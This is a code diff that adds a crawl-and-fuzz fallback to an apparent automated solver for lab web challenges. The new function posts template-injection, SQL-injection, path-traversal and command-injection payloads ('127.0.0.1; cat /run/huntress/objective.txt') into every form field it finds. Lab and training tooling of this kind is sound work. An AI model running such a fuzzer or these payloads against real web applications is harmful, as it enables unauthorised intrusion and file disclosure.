@@ -890,7 +890,80 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
     except Exception:
         pass
 
+    # Systematic HTML & Form Deep Crawl
+    try:
+        return solve_deep_crawl(target_url)
+    except Exception:
+        pass
+
     raise WebHandlerError(f"Could not fingerprint target {target_url}")
+
+
+def solve_deep_crawl(target_url: str) -> str:
+    """Extract and fuzz all visible HTML links, forms, and inputs."""
+    base = target_url.rstrip("/")
+    status, home, _ = _request(f"{base}/")
+    proof = _extract_proof(home)
+    if proof:
+        return proof
+
+    # Discover and inspect all links
+    links = set(re.findall(r'href=[\'"](/?[^\'"#]+)[\'"]', home))
+    for link in links:
+        if any(link.endswith(ext) for ext in [".css", ".svg", ".png", ".jpg", ".ico", ".js"]):
+            continue
+        link_url = link if link.startswith("/") else f"/{link}"
+        try:
+            st, text, _ = _request(f"{base}{link_url}")
+            proof = _extract_proof(text)
+            if proof:
+                return proof
+        except Exception:
+            pass
+
+    # Parse and fuzz all HTML forms
+    forms = re.findall(r"<form[\s\S]*?</form>", home, re.IGNORECASE)
+    payloads = [
+        "{{objective}}",
+        "' OR 1=1 --",
+        "../../../../run/huntress/objective.txt",
+        "administrator",
+        "127.0.0.1; cat /run/huntress/objective.txt",
+    ]
+    for form in forms:
+        action_match = re.search(r'action=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
+        method_match = re.search(r'method=[\'"]([^\'"]*)[\'"]', form, re.IGNORECASE)
+        action = action_match.group(1) if action_match else "/"
+        method = method_match.group(1).upper() if method_match else "POST"
+        if not action.startswith("/"):
+            action = f"/{action}"
+
+        inputs = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
+        textareas = re.findall(r'<textarea[^>]*name=[\'"]([^\'"]+)[\'"]', form, re.IGNORECASE)
+        input_names = inputs + textareas
+
+        for pl in payloads:
+            # Test JSON post
+            try:
+                json_data = json.dumps({name: pl for name in input_names}).encode("utf-8")
+                st, res, _ = _request(f"{base}{action}", method=method, data=json_data, headers={"Content-Type": "application/json"})
+                proof = _extract_proof(res)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+            # Test Form-urlencoded post
+            try:
+                form_data = urllib.parse.urlencode({name: pl for name in input_names}).encode("utf-8")
+                st, res, _ = _request(f"{base}{action}", method=method, data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                proof = _extract_proof(res)
+                if proof:
+                    return proof
+            except Exception:
+                pass
+
+    raise WebHandlerError("Deep crawl did not extract proof")
 
 
 def solve_autonomous_web(target_url: str) -> str:
